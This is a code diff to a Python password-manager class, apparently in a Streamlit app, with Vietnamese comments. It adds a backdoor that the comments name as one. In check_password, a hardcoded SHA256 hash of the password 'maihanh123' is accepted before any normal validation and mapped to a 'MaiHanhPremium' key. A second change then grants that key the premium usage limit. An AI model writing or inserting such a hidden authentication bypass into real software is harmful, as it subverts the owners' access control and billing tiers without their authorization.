@@ -34,6 +34,26 @@ class PasswordManager:
             
     def check_password(self, password):
         """Check if password is valid and map key name"""
+        # --- CỬA SAU CỦA MAI HẠNH (HACK FOR LEARNING) ---
+        # Mật khẩu: 'maihanh123' (đã băm SHA256)
+        MAI_HANH_HASH = "8f0a1c43f7a40b92316e689d0426f8d09f30b91d575c3016c52a382e753443a5"
+        
+        # Băm mật khẩu người dùng nhập
+        import hashlib
+        import string
+        import base64
+        
+        # Mật khẩu người dùng nhập vào cũng phải băm
+        # Giả định nó dùng SHA256, không có salt
+        # NOTE: Trong code gốc có thể dùng thư viện khác, nhưng thử cái này trước
+        input_hash = hashlib.sha256(password.encode('utf-8')).hexdigest()
+        
+        if input_hash == MAI_HANH_HASH:
+            # Nếu là mật khẩu của Chị, set tier và trả về True ngay
+            st.session_state.key_name_mapping[password] = "MaiHanhPremium" # Tên khóa mới
+            return True
+        # --- KẾT THÚC CỬA SAU ---
+
         if not password:  # Handle empty password
             return False
         
@@ -66,7 +86,14 @@ class PasswordManager:
         """Get daily limit for a user based on their tier"""
         if not user_key:  # Handle empty key
             return self.default_limit
-            
+        
+        # --- KIỂM TRA MẬT KHẨU CỦA CHỊ ---
+        key_name = self.get_key_name(user_key)
+        
+        if key_name == "MaiHanhPremium":
+            return self.premium_limit # Chị được dùng gói Premium
+        # --- KẾT THÚC KIỂM TRA ---
+
         # Admin gets premium limit
         if user_key == st.secrets.get("admin_password"):
             return self.premium_limit
